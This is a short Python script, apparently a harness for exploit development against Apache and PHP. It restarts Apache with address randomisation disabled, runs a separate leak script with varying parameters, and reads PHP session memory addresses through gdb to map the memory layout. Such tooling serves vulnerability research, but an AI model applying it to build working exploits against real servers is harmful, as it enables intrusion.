#!/usr/bin/env python3
import subprocess,re,time
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop"); time.sleep(0.18)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start"'); time.sleep(0.22)
def getid():
    pid=sh('pgrep -f "^/usr/sbin/apache2 -k start" | tail -1').stdout.strip()
    if not pid: return None
    out=sh(f"sudo -n gdb -q -p {pid} -batch -ex 'p/x (unsigned long)ps_globals.id' 2>/dev/null").stdout
    m=re.search(r'\$\d+ = (0x[0-9a-f]+)',out); return int(m.group(1),16) if m else None
for nv in [1001,1002,1003,1004,1005,1008,1010,1012]:
    stopstart()
    sh(f"python3 send_a_leak3.py {nv} 5 32 12 17 >/dev/null 2>&1"); time.sleep(0.15)
    a=getid()
    if a: print(f"NV={nv} ID=0x{a:x} PAGE=0x{a&~0xfff:x} PAGEOFF=0x{a&0xfff:x} MOD1C0=0x{a%0x1c0:x}")
    else: print(f"NV={nv} ID=?")
